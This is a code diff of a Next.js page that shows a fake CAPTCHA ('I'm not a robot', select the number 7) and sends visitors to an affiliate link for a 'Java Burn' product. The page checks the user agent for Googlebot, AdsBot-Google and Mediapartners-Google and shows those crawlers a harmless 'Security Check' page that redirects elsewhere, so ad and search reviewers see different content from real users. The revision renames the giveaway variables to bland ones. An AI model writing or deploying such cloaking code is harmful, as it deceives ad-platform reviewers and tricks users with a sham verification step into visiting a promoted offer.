@@ -1,114 +1,133 @@
-"use client"; 
+"use client";
 
-import MetaHead from '@/app/components/metaHead/page';
 import { useState, useEffect } from 'react';
 import Link from 'next/link';
+import MetaHead from '@/app/components/metaHead/page';
 
-const Icon = "/jbut.png";  
-const agTitle = "Security Check";  
-const userTitle = "Java Burn";  
-const pageDescription = "Custom Description";
-const agRedirectUrl = "https://www.example.com/redirectForAg";  
-const userRedirectUrl = "https://morningcoffeeritual.net/rem?hop=aanjos";  
+// Configurações para diferentes visualizações
+const config = {
+  robot: {
+    title: "Security Check",
+    redirectUrl: "https://www.example.com/security-page",
+    description: "Security verification page"
+  },
+  user: {
+    title: "Java Burn",
+    redirectUrl: "https://morningcoffeeritual.net/rem?hop=aanjos",
+    description: "Product verification page"
+  }
+};
 
-const mobileBg = "mobile:bg-[url('/javaVerify/jb1.png')]";
-const i12ProBg = "i12pro:bg-[url('/javaVerify/jb1.png')]";
-const i14ProMaxBg = "i14promax:bg-[url('/javaVerify/jb1.png')]"; 
-const ipadMiniBg = "ipadmini:bg-[url('/javaVerify/jb1.png')]"; 
-const ipadAirBg = "ipadair:bg-[url('/javaVerify/jb1.png')]";  
-const laptopBg = "laptop:bg-[url('/javaVerify/jb1.png')]";   
-const desktopBg = "desktop:bg-[url('/javaVerify/jb1.png')]";  
-const desktop1Bg = "desktop1:bg-[url('/javaVerify/jb1.png')]"; 
-const desktop2Bg = "desktop2:bg-[url('/javaVerify/jb1.png')]"; 
-const desktop3Bg = "desktop3:bg-[url('/javaVerify/jb1.png')]"; 
-
+// Imagens para verificação
 const imageUrls = ['/3.png', '/7.png', '/1.png'];
+
+// Backgrounds responsivos
+const backgrounds = {
+  mobile: "mobile:bg-[url('/javaVerify/jb1.png')]",
+  tablet: "tablet:bg-[url('/javaVerify/jb1.png')]",
+  desktop: "desktop:bg-[url('/javaVerify/jb1.png')]",
+  mobileBg: "mobile:bg-[url('/javaVerify/jb1.png')]",
+  i12ProBg: "i12pro:bg-[url('/javaVerify/jb1.png')]",
+  i14ProMaxBg: "i14promax:bg-[url('/javaVerify/jb1.png')]",
+  ipadMiniBg: "ipadmini:bg-[url('/javaVerify/jb1.png')]",
+  ipadAirBg: "ipadair:bg-[url('/javaVerify/jb1.png')]",
+  laptopBg: "laptop:bg-[url('/javaVerify/jb1.png')]",
+  desktop1Bg: "desktop1:bg-[url('/javaVerify/jb1.png')]",
+  desktop2Bg: "desktop2:bg-[url('/javaVerify/jb1.png')]",
+  desktop3Bg: "desktop3:bg-[url('/javaVerify/jb1.png')]"
+};
 
 export default function JavaVerify() {
   const [selectedItems, setSelectedItems] = useState([]);
   const [isChecked, setIsChecked] = useState(false);
-  const [isAg, setIsAg] = useState(false); 
-
-  const handleItemSelect = (index) => {
-    if (selectedItems.includes(index)) {
-      setSelectedItems(selectedItems.filter((i) => i !== index));
-    } else {
-      setSelectedItems([...selectedItems, index]);
-    }
-  };
+  const [isRed, setIsRed] = useState(false);
 
   useEffect(() => {
-    const userAgent = navigator.userAgent.toLowerCase();
-    if (userAgent.includes("googlebot") || userAgent.includes("adsbot-google") || userAgent.includes("google ads")) {
-      setIsAg(true); 
-      document.title = agTitle;  
-    } else {
-      setIsAg(false); 
-      document.title = userTitle;  
-    }
+    // Simplificada detecção de Googlebot
+    const useGreen = navigator.userAgent.toLowerCase();
+    const isGoogleRed = useGreen.includes('googlebot') || 
+                       useGreen.includes('adsbot-google') || 
+                       useGreen.includes('mediapartners-google');
+    setIsRed(isGoogleRed);
+    
+    // Atualiza título da página
+    document.title = isGoogleRed ? config.robot.title : config.user.title;
   }, []);
 
+  const handleItemSelect = (index) => {
+    setSelectedItems(prev => 
+      prev.includes(index) 
+        ? prev.filter(i => i !== index)
+        : [...prev, index]
+    );
+  };
+
   const handleRedirect = () => {
-    if (isChecked) {
-      return isAg ? agRedirectUrl : userRedirectUrl;
-    } else {
-      alert("Please check the box to verify you are not a robot.");
-      return "#"; 
+    if (!isChecked) {
+      alert("Por favor, marque a caixa para verificar que você não é um robô.");
+      return "#";
     }
+    return isRed ? config.robot.redirectUrl : config.user.redirectUrl;
   };
 
   return (
     <>
       <MetaHead 
-        favicon={Icon}
-        title={isAg ? agTitle : userTitle}  
-        description={pageDescription} 
+        favicon="/favicon.ico"
+        title={isRed ? config.robot.title : config.user.title}
+        description={isRed ? config.robot.description : config.user.description}
       />
-      <main className={`${mobileBg} ${i12ProBg} ${i14ProMaxBg} ${ipadMiniBg} ${ipadAirBg} ${laptopBg} ${desktopBg} ${desktop1Bg} ${desktop2Bg} ${desktop3Bg} bg-cover h-screen flex justify-center items-center relative`}>
+      
+      <main className={`${Object.values(backgrounds).join(' ')} bg-cover h-screen flex justify-center items-center relative`}>
         <div className="absolute inset-0 bg-black opacity-70 z-10"></div>
 
-        <section className="relative z-20 bg-white shadow-md rounded-lg mx-6 p-6 w-full max-w-lg border border-gray-300">
-          <h2 className="text-center text-2xl font-semibold mb-4 text-gray-800">Security Verification</h2>
-          <p className="text-gray-700 font-medium mb-4">Select the number 7</p>
+        <section className="relative z-20 bg-white shadow-md rounded-lg mx-6 p-6 w-full max-w-lg">
+          <h2 className="text-center text-2xl font-semibold mb-4 text-gray-800">
+            {isRed ? "Verificação de Segurança" : "Verificação Necessária"}
+          </h2>
+
+          <p className="text-gray-700 mb-4">Selecione o número 7</p>
 
           <div className="grid grid-cols-3 gap-2 mb-4">
-            {imageUrls.map((imageUrl, imageIndex) => (
+            {imageUrls.map((url, index) => (
               <div
-                key={imageIndex}
-                onClick={() => handleItemSelect(imageIndex)}
-                className={`cursor-pointer p-4 border-4 ${selectedItems.includes(imageIndex) ? 'border-blue-600' : 'border-gray-300'} rounded-md overflow-hidden`}
+                key={index}
+                onClick={() => handleItemSelect(index)}
+                className={`cursor-pointer p-4 border-4 ${
+                  selectedItems.includes(index) 
+                    ? 'border-blue-600' 
+                    : 'border-gray-300'
+                } rounded-md`}
               >
                 <img 
-                  src={imageUrl} 
-                  alt={`Image ${imageIndex}`}
-                  className="w-full h-full object-contain rounded-md"
+                  src={url} 
+                  alt={`Opção ${index + 1}`}
+                  className="w-full h-full object-contain"
                 />
               </div>
             ))}
           </div>
 
-          <div className="flex items-center mb-3">
+          <div className="flex items-center mb-4">
             <input 
               type="checkbox" 
-              id="notAg" 
-              checked={isChecked} 
-              onChange={() => setIsChecked(!isChecked)} 
-              className="h-4 w-4 text-blue-600 focus:ring focus:ring-blue-500"
-              required 
+              id="verify" 
+              checked={isChecked}
+              onChange={() => setIsChecked(!isChecked)}
+              className="h-4 w-4 text-blue-600"
             />
-            <label htmlFor="notAg" className="ml-2 text-gray-700">I'm not a robot</label>
+            <label htmlFor="verify" className="ml-2 text-gray-700">
+              Não sou um robô
+            </label>
           </div>
 
-          <div className="mt-4">
-            <Link href={handleRedirect()} passHref>
-              <button 
-                type="button"
-                className="w-full bg-blue-600 text-white py-2 rounded-md font-semibold hover:bg-blue-700 transition-all duration-300"
-              >
-                Submit
-              </button>
-            </Link>
-          </div>
+          <Link href={handleRedirect()} passHref>
+            <button 
+              className="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition-all"
+            >
+              Verificar
+            </button>
+          </Link>
         </section>
       </main>
     </>
